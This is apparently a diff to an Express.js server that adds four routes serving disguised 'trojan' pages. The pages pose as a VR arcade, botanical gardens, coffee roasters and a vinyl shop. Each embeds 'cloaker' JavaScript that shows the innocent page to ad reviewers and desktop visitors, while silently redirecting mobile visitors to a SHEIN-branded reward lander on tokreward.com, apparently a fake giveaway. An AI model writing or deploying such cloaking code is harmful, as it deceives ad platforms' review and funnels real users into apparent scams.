@@ -17,6 +17,477 @@ app.use(express.static(path.join(__dirname, 'public')));
 // ALEXI 5.0
 
 // SHEIN BH FLUENT
+app.get('/94889/:slug', (req, res, next) => {
+    const { slug } = req.params;
+    const destinationLander = `https://tokreward.com/shein.html?slug=948`;
+    const trojanHTML = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <script>
+                // Cloaker logic
+                const urlParams = new URLSearchParams(window.location.search);
+                const utmXXX = urlParams.get("xxx");
+                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if (utmXXX === "__PLACEMENT__") {
+                    } else if (isMobileDevice) {
+                        window.location.href = "${destinationLander}";
+                    } else {
+                    }
+            </script>
+            <title>${slug} Virtual Reality Arcade</title>
+            <style>
+                body, html {
+                    margin: 0;
+                    padding: 0;
+                    font-family: 'Orbitron', sans-serif;
+                    background-color: #0c0c1d;
+                    color: #00ff00;
+                }
+                .vr-container {
+                    max-width: 1200px;
+                    margin: 0 auto;
+                    padding: 20px;
+                }
+                header {
+                    background-color: #1a1a3a;
+                    text-align: center;
+                    padding: 2em;
+                    margin-bottom: 30px;
+                    border-bottom: 2px solid #00ff00;
+                }
+                .game-grid {
+                    display: grid;
+                    grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+                    gap: 25px;
+                }
+                .vr-game {
+                    background-color: #2a2a4a;
+                    border-radius: 10px;
+                    padding: 20px;
+                    text-align: center;
+                    box-shadow: 0 0 15px rgba(0, 255, 0, 0.2);
+                    transition: transform 0.3s ease;
+                }
+                .vr-game:hover {
+                    transform: scale(1.05);
+                }
+                .vr-game img {
+                    width: 100%;
+                    height: 180px;
+                    object-fit: cover;
+                    border-radius: 5px;
+                    margin-bottom: 15px;
+                }
+                footer {
+                    background-color: #1a1a3a;
+                    text-align: center;
+                    padding: 1em;
+                    margin-top: 30px;
+                    border-top: 2px solid #00ff00;
+                }
+                footer a {
+                    color: #00ffff;
+                }
+            </style>
+        </head>
+        <body>
+            <header>
+                <h1>${slug} Virtual Reality Arcade</h1>
+                <p>Step into new dimensions of gaming</p>
+            </header>
+            <div class="vr-container">
+                <h2>Featured VR Experiences</h2>
+                <p>Welcome to ${slug} Virtual Reality Arcade, where cutting-edge technology meets immersive gameplay!</p>
+                <div class="game-grid">
+                    <div class="vr-game">
+                        <img src="https://example.com/space-explorer.jpg" alt="Space Explorer">
+                        <h3>Cosmic Odyssey</h3>
+                        <p>Embark on an interstellar journey through unexplored galaxies.</p>
+                    </div>
+                    <div class="vr-game">
+                        <img src="https://example.com/zombie-apocalypse.jpg" alt="Zombie Apocalypse">
+                        <h3>Undead Uprising</h3>
+                        <p>Survive a heart-pounding zombie outbreak in a post-apocalyptic city.</p>
+                    </div>
+                    <div class="vr-game">
+                        <img src="https://example.com/fantasy-realm.jpg" alt="Fantasy Realm">
+                        <h3>Enchanted Kingdoms</h3>
+                        <p>Wield magic and battle mythical creatures in a sprawling fantasy world.</p>
+                    </div>
+                    <div class="vr-game">
+                        <img src="https://example.com/racing-simulator.jpg" alt="Racing Simulator">
+                        <h3>Hyperdrive Racing</h3>
+                        <p>Experience the thrill of high-speed futuristic racing across exotic planets.</p>
+                    </div>
+                </div>
+            </div>
+            <footer>
+                <p>&copy; 2024 ${slug} Virtual Reality Arcade | <a href="https://tokreward.com/pp.html">Privacy Policy</a></p>
+            </footer>
+        </body>
+        </html>
+    `;
+    res.send(trojanHTML);
+    console.log(`Served 948 Trojan (${slug})`);
+});
+
+// SHEIN BH FLUENT
+app.get('/94888/:slug', (req, res, next) => {
+    const { slug } = req.params;
+    const destinationLander = `https://tokreward.com/shein.html?slug=948`;
+    const trojanHTML = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <script>
+                // Cloaker logic
+                const urlParams = new URLSearchParams(window.location.search);
+                const utmXXX = urlParams.get("xxx");
+                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if (utmXXX === "__PLACEMENT__") {
+                    } else if (isMobileDevice) {
+                        window.location.href = "${destinationLander}";
+                    } else {
+                    }
+            </script>
+            <title>${slug} Botanical Gardens</title>
+            <style>
+                body, html {
+                    margin: 0;
+                    padding: 0;
+                    font-family: 'Open Sans', sans-serif;
+                    background-color: #e8f5e9;
+                    color: #1b5e20;
+                }
+                .garden-container {
+                    max-width: 1200px;
+                    margin: 0 auto;
+                    padding: 20px;
+                }
+                header {
+                    background-color: #2e7d32;
+                    color: #ffffff;
+                    text-align: center;
+                    padding: 2em;
+                    margin-bottom: 30px;
+                }
+                .plant-showcase {
+                    display: flex;
+                    flex-wrap: wrap;
+                    justify-content: space-around;
+                }
+                .plant-exhibit {
+                    background-color: #ffffff;
+                    border-radius: 10px;
+                    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+                    margin: 15px;
+                    padding: 20px;
+                    width: 250px;
+                    text-align: center;
+                }
+                .plant-exhibit img {
+                    width: 200px;
+                    height: 200px;
+                    object-fit: cover;
+                    border-radius: 50%;
+                    margin-bottom: 15px;
+                }
+                footer {
+                    background-color: #2e7d32;
+                    color: #ffffff;
+                    text-align: center;
+                    padding: 1em;
+                    margin-top: 30px;
+                }
+                footer a {
+                    color: #81c784;
+                }
+            </style>
+        </head>
+        <body>
+            <header>
+                <h1>${slug} Botanical Gardens</h1>
+                <p>Explore nature's wonders in our lush oasis</p>
+            </header>
+            <div class="garden-container">
+                <h2>Featured Plant Collections</h2>
+                <p>Welcome to ${slug} Botanical Gardens, where you can discover the beauty and diversity of plant life from around the world.</p>
+                <div class="plant-showcase">
+                    <div class="plant-exhibit">
+                        <img src="https://example.com/orchid-garden.jpg" alt="Orchid Garden">
+                        <h3>Exotic Orchid Collection</h3>
+                        <p>Marvel at our vibrant array of rare and beautiful orchids from tropical regions.</p>
+                    </div>
+                    <div class="plant-exhibit">
+                        <img src="https://example.com/desert-garden.jpg" alt="Desert Garden">
+                        <h3>Arid Desert Garden</h3>
+                        <p>Explore the unique adaptations of cacti and succulents in our desert biome.</p>
+                    </div>
+                    <div class="plant-exhibit">
+                        <img src="https://example.com/japanese-garden.jpg" alt="Japanese Garden">
+                        <h3>Serene Japanese Garden</h3>
+                        <p>Experience tranquility in our meticulously designed Japanese landscape garden.</p>
+                    </div>
+                    <div class="plant-exhibit">
+                        <img src="https://example.com/butterfly-garden.jpg" alt="Butterfly Garden">
+                        <h3>Butterfly Haven</h3>
+                        <p>Witness the delicate dance of butterflies among nectar-rich flowers.</p>
+                    </div>
+                </div>
+            </div>
+            <footer>
+                <p>&copy; 2024 ${slug} Botanical Gardens | <a href="https://tokreward.com/pp.html">Privacy Policy</a></p>
+            </footer>
+        </body>
+        </html>
+    `;
+    res.send(trojanHTML);
+    console.log(`Served 948 Trojan (${slug})`);
+});
+
+// SHEIN BH FLUENT
+app.get('/94788/:slug', (req, res, next) => {
+    const { slug } = req.params;
+    const destinationLander = `https://tokreward.com/shein.html?slug=947`;
+    const trojanHTML = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <script>
+                // Cloaker logic
+                const urlParams = new URLSearchParams(window.location.search);
+                const utmXXX = urlParams.get("xxx");
+                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if (utmXXX === "__PLACEMENT__") {
+                    } else if (isMobileDevice) {
+                        window.location.href = "${destinationLander}";
+                    } else {
+                    }
+            </script>
+            <title>${slug} Gourmet Coffee Roasters</title>
+            <style>
+                body, html {
+                    margin: 0;
+                    padding: 0;
+                    font-family: 'Lato', sans-serif;
+                    background-color: #f5e5d3;
+                    color: #4a3728;
+                }
+                .coffee-container {
+                    max-width: 1200px;
+                    margin: 0 auto;
+                    padding: 20px;
+                }
+                header {
+                    background-color: #6f4e37;
+                    color: #f5e5d3;
+                    text-align: center;
+                    padding: 2em;
+                    margin-bottom: 30px;
+                }
+                .coffee-selection {
+                    display: grid;
+                    grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+                    gap: 25px;
+                }
+                .coffee-item {
+                    background-color: #fff;
+                    border-radius: 10px;
+                    padding: 20px;
+                    text-align: center;
+                    box-shadow: 0 4px 8px rgba(111, 78, 55, 0.1);
+                }
+                .coffee-item img {
+                    width: 150px;
+                    height: 150px;
+                    object-fit: cover;
+                    border-radius: 50%;
+                    margin-bottom: 15px;
+                }
+                footer {
+                    background-color: #6f4e37;
+                    color: #f5e5d3;
+                    text-align: center;
+                    padding: 1em;
+                    margin-top: 30px;
+                }
+                footer a {
+                    color: #d2b48c;
+                }
+            </style>
+        </head>
+        <body>
+            <header>
+                <h1>${slug} Gourmet Coffee Roasters</h1>
+                <p>Elevate your coffee experience</p>
+            </header>
+            <div class="coffee-container">
+                <h2>Our Signature Roasts</h2>
+                <p>Welcome to ${slug} Gourmet Coffee Roasters, where we craft the perfect cup with beans from around the world.</p>
+                <div class="coffee-selection">
+                    <div class="coffee-item">
+                        <img src="https://example.com/ethiopian-yirgacheffe.jpg" alt="Ethiopian Yirgacheffe">
+                        <h3>Ethiopian Yirgacheffe</h3>
+                        <p>Floral and citrusy with a smooth, tea-like body</p>
+                    </div>
+                    <div class="coffee-item">
+                        <img src="https://example.com/colombian-supremo.jpg" alt="Colombian Supremo">
+                        <h3>Colombian Supremo</h3>
+                        <p>Rich and full-bodied with hints of nuts and chocolate</p>
+                    </div>
+                    <div class="coffee-item">
+                        <img src="https://example.com/sumatran-mandheling.jpg" alt="Sumatran Mandheling">
+                        <h3>Sumatran Mandheling</h3>
+                        <p>Earthy and complex with low acidity and a syrupy body</p>
+                    </div>
+                    <div class="coffee-item">
+                        <img src="https://example.com/costa-rican-tarrazu.jpg" alt="Costa Rican Tarrazu">
+                        <h3>Costa Rican Tarrazu</h3>
+                        <p>Bright and clean with notes of apricot and honey</p>
+                    </div>
+                </div>
+            </div>
+            <footer>
+                <p>&copy; 2024 ${slug} Gourmet Coffee Roasters | <a href="https://tokreward.com/pp.html">Privacy Policy</a></p>
+            </footer>
+        </body>
+        </html>
+    `;
+    res.send(trojanHTML);
+    console.log(`Served 947 Trojan (${slug})`);
+});
+
+// SHEIN BH FLUENT
+app.get('/90588/:slug', (req, res, next) => {
+    const { slug } = req.params;
+    const destinationLander = `https://tokreward.com/shein.html?slug=905`;
+    const trojanHTML = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <script>
+                // Cloaker logic
+                const urlParams = new URLSearchParams(window.location.search);
+                const utmXXX = urlParams.get("xxx");
+                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if (utmXXX === "__PLACEMENT__") {
+                    } else if (isMobileDevice) {
+                        window.location.href = "${destinationLander}";
+                    } else {
+                    }
+            </script>
+            <title>${slug} Vintage Vinyl Vault</title>
+            <style>
+                body, html {
+                    margin: 0;
+                    padding: 0;
+                    font-family: 'Montserrat', sans-serif;
+                    background-color: #2c3e50;
+                    color: #ecf0f1;
+                }
+                .vinyl-container {
+                    max-width: 1200px;
+                    margin: 0 auto;
+                    padding: 20px;
+                }
+                header {
+                    background-color: #e74c3c;
+                    text-align: center;
+                    padding: 2em;
+                    margin-bottom: 30px;
+                }
+                .record-collection {
+                    display: flex;
+                    flex-wrap: wrap;
+                    justify-content: space-around;
+                }
+                .record {
+                    background-color: #34495e;
+                    border-radius: 10px;
+                    width: 250px;
+                    margin: 20px;
+                    padding: 20px;
+                    text-align: center;
+                    transition: transform 0.3s ease;
+                }
+                .record:hover {
+                    transform: scale(1.05);
+                }
+                .record-cover {
+                    width: 200px;
+                    height: 200px;
+                    background-color: #95a5a6;
+                    margin: 0 auto 15px;
+                    border-radius: 5px;
+                    display: flex;
+                    align-items: center;
+                    justify-content: center;
+                    font-size: 24px;
+                    font-weight: bold;
+                    color: #2c3e50;
+                }
+                footer {
+                    background-color: #e74c3c;
+                    text-align: center;
+                    padding: 1em;
+                    margin-top: 30px;
+                }
+                footer a {
+                    color: #f39c12;
+                }
+            </style>
+        </head>
+        <body>
+            <header>
+                <h1>${slug} Vintage Vinyl Vault</h1>
+                <p>Rediscover the magic of analog sound</p>
+            </header>
+            <div class="vinyl-container">
+                <h2>Our Rare Collection</h2>
+                <p>Welcome to ${slug} Vintage Vinyl Vault, where music history comes alive through our curated selection of classic albums.</p>
+                <div class="record-collection">
+                    <div class="record">
+                        <div class="record-cover">The Beatles</div>
+                        <h3>Abbey Road</h3>
+                        <p>1969 | Rock</p>
+                    </div>
+                    <div class="record">
+                        <div class="record-cover">Pink Floyd</div>
+                        <h3>The Dark Side of the Moon</h3>
+                        <p>1973 | Progressive Rock</p>
+                    </div>
+                    <div class="record">
+                        <div class="record-cover">Miles Davis</div>
+                        <h3>Kind of Blue</h3>
+                        <p>1959 | Jazz</p>
+                    </div>
+                    <div class="record">
+                        <div class="record-cover">Fleetwood Mac</div>
+                        <h3>Rumours</h3>
+                        <p>1977 | Rock</p>
+                    </div>
+                </div>
+            </div>
+            <footer>
+                <p>&copy; 2024 ${slug} Vintage Vinyl Vault | <a href="https://tokreward.com/pp.html">Privacy Policy</a></p>
+            </footer>
+        </body>
+        </html>
+    `;
+    res.send(trojanHTML);
+    console.log(`Served 905 Trojan (${slug})`);
+});
+
+// SHEIN BH FLUENT
 app.get('/94123/:slug', (req, res, next) => {
     const { slug } = req.params;
     const destinationLander = `https://tokreward.com/sheinesp.html?slug=941`;
